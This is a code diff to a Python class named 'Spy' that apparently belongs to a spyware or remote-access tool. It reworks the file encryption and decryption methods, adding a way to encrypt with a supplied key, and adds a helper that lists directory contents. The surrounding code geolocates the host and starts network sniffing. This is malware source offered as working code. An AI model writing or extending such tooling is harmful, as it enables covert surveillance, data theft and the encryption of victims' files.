@@ -151,21 +151,31 @@ class Spy:
     def get_location():
         return geocoder.ip('me').json
 
-    @property
-    def encryption_key(self) -> str:
-        if self.encryptor:
-            return self.encryptor.encryption_key.decode()
+    def generate_key(self):
         self.encryptor = Encryptor()
         return self.encryptor.encryption_key.decode()
 
-    def encrypt(self, path: str) -> Tuple[list, list]:
+    # @property
+    def encryption_key(self) -> str:
+        if self.encryptor:
+            return self.encryptor.encryption_key.decode()
+        return self.generate_key()
+
+    def encrypt(self, path: str, key=None) -> Tuple[list, list]:
+        if not key:
+            return self.encryptor.encrypt(path)
+        self.encryptor = Encryptor(key)
         return self.encryptor.encrypt(path)
 
     def decrypt(self, path: str, key=None) -> Tuple[list, list]:
         if not key:
             return self.encryptor.decrypt(path)
         e = Encryptor(key)
-        return self.decrypt(path)
+        return e.decrypt(path)
+
+    @staticmethod
+    def show_files(path: str) -> str:
+        return ",".join([file for file in os.listdir(path)])
 
     @staticmethod
     def start_sniffing_to_file(path: str, ip: str, port: int) -> bool:
